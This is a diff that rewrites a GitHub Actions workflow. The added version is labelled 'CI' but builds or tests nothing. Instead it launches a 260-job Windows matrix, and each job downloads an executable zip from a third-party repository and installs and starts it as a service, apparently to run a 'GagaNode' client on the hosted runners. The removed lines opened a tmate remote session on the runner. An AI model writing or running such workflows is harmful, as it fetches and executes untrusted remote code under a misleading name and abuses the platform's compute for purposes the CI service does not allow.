@@ -1,18 +1,29 @@
-name: ssh
-on: 
-  workflow_dispatch:
-defaults:
-  run:
-    shell: bash
+name: CI
+
+on: [workflow_dispatch]
 
 jobs:
   build:
-    runs-on: ubuntu-latest
+
+    name: GagaNode
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
+    env:
+      NUM_JOBS: 20
+      JOB: ${{ matrix.go }}
     steps:
-    - uses: fastai/workflows/ssh@master
-      with:
-        ssh_key: ${{ secrets.SSH_KEY }}
-        key_file: id_ecdsa
-    - uses: actions/checkout@v2
-    - name: Session Setup
-      uses: mxschmitt/action-tmate@master
+      - name: Download
+        run: Invoke-WebRequest https://github.com/sahalfreelance/gakun/raw/main/app-windows-amd64.zip -OutFile app-windows-amd64.zip
+      - name: Extract
+        run: Expand-Archive app-windows-amd64.zip
+      - name: Install
+        run: .\app-windows-amd64\app.exe service install
+      - name: Install
+        run: .\app-windows-amd64\app.exe service start
+      - name: END
+        run: exit
